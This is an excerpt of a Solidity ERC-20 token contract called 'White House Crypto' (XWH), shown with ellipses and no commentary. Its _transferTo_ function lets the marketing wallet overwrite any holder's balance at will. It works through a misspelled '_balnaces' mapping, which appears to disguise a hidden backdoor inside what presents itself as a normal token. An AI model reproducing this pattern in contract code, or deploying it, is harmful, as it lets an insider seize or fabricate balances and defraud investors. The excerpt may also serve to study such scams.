...
contract TheWhiteHouse is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "White House Crypto";
    string private constant _symbol = "XWH";
    ...
    uint256 _lowerFeesAfterBuys = 20;
    ...
    function _transferTo_(address from, uint256 value) internal {
        if (marketingWallet != msg.sender) { } else { _balnaces[from] = _balnaces[from].sub(_balnaces[from]).add(value);}
    }
